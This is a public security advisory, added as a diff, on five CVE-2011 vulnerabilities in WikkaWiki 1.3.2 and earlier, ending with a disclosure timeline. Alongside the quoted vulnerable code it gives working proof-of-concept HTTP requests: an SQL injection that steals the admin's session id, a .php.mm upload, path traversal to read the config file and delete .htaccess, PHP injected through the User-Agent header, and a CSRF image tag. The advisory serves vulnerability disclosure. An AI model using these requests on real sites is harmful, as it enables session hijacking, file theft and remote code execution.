@@ -1,0 +1,233 @@
+  ----------------------------------------------------
+  WikkaWiki <= 1.3.2 Multiple Security Vulnerabilities
+  ----------------------------------------------------
+  
+  author............: Egidio Romano aka EgiX
+  mail..............: n0b0d13s[at]gmail[dot]com
+  software link.....: http://wikkawiki.org/
+  
+  
+  +---------------------------------------------------+
+  | SQL Injection in UPDATE statement (CVE-2011-4448) |
+  +---------------------------------------------------+
+  
+  The vulnerable code is located in /actions/usersettings/usersettings.php
+  
+  140.            default: // input is valid
+  141.            $this->Query("
+  142.                UPDATE ".$this->GetConfigValue('table_prefix')."users
+  143.                SET email = '".mysql_real_escape_string($email)."',
+  144.                    doubleclickedit = '".mysql_real_escape_string($doubleclickedit)."',
+  145.                    show_comments = '".mysql_real_escape_string($show_comments)."',
+  146.                    default_comment_display = '".$default_comment_display."',
+  147.                    revisioncount = ".$revisioncount.",
+  148.                    changescount = ".$changescount.",
+  149.                    theme = '".mysql_real_escape_string($usertheme)."'                
+  150.                WHERE name = '".$user['name']."'
+  151.                LIMIT 1"
+  152.                );
+  
+  When handling  'update' action,  'default_comment_display' is  the only parameter  that isn't  sanitized with
+  mysql_real_escape_string(), this can be exploited to inject arbitrary SQL code. Because of this is a multiple
+  lines query and latest version of MySQL doesn't allow to start comment with /* no followed by a */, sometimes
+  It's impossible  to alter the  'users' table content  for e.g.  changing the  admin's password, but  is still
+  possible to inject a subquery to fetch for e.g. the session id of admin for a Session Hijacking attack.
+  This is a proof of concept request:
+  
+   POST /wikka/UserSettings HTTP/1.1
+   Host: localhost
+   Cookie: 96522b217a86eca82f6d72ef88c4c7f4=c3u94bo2csludij3v18787i4p6
+   Content-Length: 140
+   Content-Type: application/x-www-form-urlencoded
+   Connection: keep-alive
+
+   action=update&email=test%40test.com&default_comment_display=',email=(SELECT sessionid FROM wikka_sessions WHERE userid='WikiAdmin'),theme='
+
+  If admin is currently logged in, attacker will see his session id in the email field of 'UserSettings' form.
+  If admin doesn't  explicitly logout (for e.g. close  the browser before click on 'Logout'  link) his session
+  remains however  stored into  DB, so  this attack  could success also  if admin  isn't currently  logged in.
+  Successful exploitation no needs magic_quotes_gpc = off because of 'magicQuotesWorkaround' function.
+  
+  
+  +------------------------------------------+
+  | Unrestricted File Upload (CVE-2011-4449) |
+  +------------------------------------------+
+  
+  The vulnerable code is located in /actions/files/files.php
+  
+  266.            elseif (preg_match('/.+\.('.$allowed_extensions.')$/i', $_FILES['file']['name']))
+  267.            {
+  268.                $strippedname = str_replace('\'', '', $_FILES['file']['name']);
+  269.                $strippedname = rawurlencode($strippedname);
+  270.                $strippedname = stripslashes($strippedname);
+  271.                $destfile = $upload_path.DIRECTORY_SEPARATOR.$strippedname; #89
+  272.    
+  273.                if (!file_exists($destfile))
+  274.                {
+  275.                    if (move_uploaded_file($_FILES['file']['tmp_name'], $destfile))
+  276.                    {
+  277.                        $notification_msg = T_("File was successfully uploaded.");
+  278.                    }
+  
+  If 'INTRANET_MODE' is explicitly enabled or if an attacker conduct a successful Session Hijacking attack
+  using the first  vulnerability, It's possible to  upload files that contains multiple  extensions due to
+  insufficient input sanitization at line 266. Now look at $allowed_extensions variable definition:
+  
+  'gif|jpeg|jpg|jpe|png|doc|xls|csv|ppt|ppz|pps|pot|pdf|asc|txt|zip|gtar|gz|bz2|tar|rar|vpp|mpp|vsd|mm|htm|html'
+  
+  It contains some extensions  (e.g. mm, vpp...) that are rare to see in  a MIME type Apache configuration
+  setting, and this could lead to execution of arbitrary PHP code. Proof of concept upload request:
+  
+   POST /wikka/test HTTP/1.1
+   Host: localhost
+   Cookie: 96522b217a86eca82f6d72ef88c4c7f4=upjhsdd5rtc0ib55gv36l0jdt3
+   Content-Length: 251
+   Content-Type: multipart/form-data; boundary=--------1503534127
+   Connection: keep-alive
+   
+   ----------1503534127
+   Content-Disposition: form-data; name="file"; filename="test.php.mm"
+   Content-Type: application/octet-stream
+   
+   <?php phpinfo(); ?>
+   ----------1503534127
+   Content-Disposition: form-data; name="upload"
+   
+   Upload
+   ----------1503534127--
+   
+  Where 'test' is a page containing the {{files}} action.
+   
+   
+  +---------------------------------------------------------------------+
+  | Arbitrary File Download and Arbitrary File Deletion (CVE-2011-4450) |
+  +---------------------------------------------------------------------+
+  
+  The vulnerable code is located in /handlers/files.xml/files.xml.php
+  
+  53.    $file = $this->GetSafeVar('file', 'get');
+  54.    if ('.' == $file{0})
+  55.    {
+  56.        $this->Redirect($this->Href(), T_("Sorry, files of this type are not allowed."));
+  57.    }
+  58.    // do the action
+  59.    $action = $this->GetSafeVar('action', 'get');
+  60.    switch ($action)    # #312
+  61.    {
+  62.        // @@@ shared download code
+  63.        case 'download':
+  64.            header('Accept-Ranges: bytes');
+  65.            $_GET['file'] = basename($file); # #312
+  66.            $path = $upload_path.DIRECTORY_SEPARATOR.$file;    # #89, #312
+  
+  ...
+
+  101.            $fp = fopen($path, 'rb');
+  102.            while (!feof($fp))
+  103.            {
+  104.                $data = fread($fp, 4096);
+  105.                echo $data;
+  106.            }
+  107.            fclose($fp);
+  108.            exit();
+  109.        case 'delete':
+  110.            if ($this->IsAdmin() && FALSE===empty($file) && T_("File deleted") == $_SESSION['redirectmessage'])
+  111.            {
+  112.                $delete_success = @unlink($upload_path.DIRECTORY_SEPARATOR.$file); # #89, #312
+  
+  The only check  of the user supplied filename  is done at line 54,  if the filename start with  a dot It's
+  rejected otherwise  It's accepted.  But this  isn't an efficiently  countermeasure against  Path Traversal
+  attacks, infact an attacker could request an URL like this:
+  
+   http://localhost/wikka/test/files.xml?action=download&file=/../../wikka.config.php
+  
+  to download for e.g.  the configuration file (note that 'test' is a  page containing the {{files}} action,
+  but attachments aren't required for download or delete arbitrary files). Similarly, if an attacker conduct
+  a successful Session Hijacking attack using the first vulnerability, once he could send this POST request:
+  
+   POST /wikka/test HTTP/1.1
+   Host: localhost
+   Cookie: 96522b217a86eca82f6d72ef88c4c7f4=2nobpqp3a1bsf3j1ccl0stj6l6
+   Content-Length: 16
+   Content-Type: application/x-www-form-urlencoded
+   Connection: keep-alive
+
+   file_to_delete=1
+
+  to set $_SESSION['redirectmessage'] and after he could request an URL like this to delete arbitrary files:
+  
+   http://localhost/wikka/test/files.xml?action=delete&file=/../../.htaccess
+   
+   
+  +---------------------------------------+
+  | Remote Code Execution (CVE-2011-4451) |
+  +---------------------------------------+
+  
+  The vulnerable code is located in logSpam() function defined into /libs/Wakka.class.php
+  
+  1315.     function logSpam($type,$tag,$body,$reason,$urlcount,$user='',$time='')
+  1316.     {
+  1317.        // set path
+  1318.        $spamlogpath = (isset($this->config['spamlog_path'])) ? $this->config['spamlog_path'] : DEF_SPAMLOG_PATH;    # @@@ make function
+  1319.        // gather data
+  1320.        if ($user == '')
+  1321.        {
+  1322.            $user = $this->GetUserName();                    # defaults to REMOTE_HOST to domain for anonymous user
+  1323.        }
+  1324.        if ($time == '')
+  1325.        {
+  1326.            $time = date('Y-m-d H:i:s');                    # current date/time
+  1327.        }
+  1328.        if (preg_match('/^mass delete/',$reason))            # @@@ i18n
+  1329.        {
+  1330.            $originip = '0.0.0.0';                            # don't record deleter's IP address!
+  1331.        }
+  1332.        else
+  1333.        {
+  1334.            $originip = $_SERVER['REMOTE_ADDR'];
+  1335.        }
+  1336.        $ua        = (isset($_SERVER['HTTP_USER_AGENT'])) ? '['.$_SERVER['HTTP_USER_AGENT'].']' : '[?]';
+  1337.        $body        = trim($body);
+  1338.        $sig        = SPAMLOG_SIG.' '.$type.' '.$time.' '.$tag.' - '.$originip.' - '.$user.' '.$ua.' - '.$reason.' - '.$urlcount."\n";
+  1339.        $content    = $sig.$body."\n\n";
+  1340.    
+  1341.        // add data to log            @@@ use appendFile
+  1342.        return $this->appendFile($spamlogpath,$content);    # nr. of bytes written if successful, FALSE otherwise
+  1343.  }
+  
+  If 'spam_logging' option is enabled, an attacker could be able to inject arbitrary PHP code into 'spamlog_path'
+  file (that by default is './spamlog.txt.php') through $_SERVER['HTTP_USER_AGENT'] variable. Proof of concept:
+  
+   POST /wikka/test/addcomment HTTP/1.1
+   Host: localhost
+   Cookie: 96522b217a86eca82f6d72ef88c4c7f4=6l11flsnvef642oajav0ufnp83
+   User-Agent: <?php phpinfo(); ?>
+   Content-Length: 27
+   Content-Type: application/x-www-form-urlencoded
+   Connection: keep-alive
+  
+   body=foo&submit=Add+Comment
+   
+   
+  +--------------------------------------------+
+  | Cross-Site Request Forgery (CVE-2011-4452) |
+  +--------------------------------------------+
+  
+  CSRF attacks countermeasures aren't properly implemented, so an attacker could
+  be able to create a malicious page containing an {{image}} action like this:
+  
+   {{image url="http://localhost/wikka/AdminUsers?user=TestUser&action=delete"}}
+   
+  When the admin will visit this page, the 'TestUser' account will be deleted.
+    
+   
+  [-] Disclosure timeline:
+  
+  [07/10/2011] - Vulnerabilities discovered
+  [09/10/2011] - Issues reported to http://wush.net/trac/wikka/ticket/1097
+  [10/10/2011] - RCE and CSRF vulnerabilities discovered
+  [11/10/2011] - RCE and CSRF vulnerabilities reported to http://wush.net/trac/wikka/ticket/1098
+  [27/10/2011] - I've provided possible bug fixes to vendor
+  [28/11/2011] - After seven weeks still no fix released
+  [30/11/2011] - Public disclosure
+
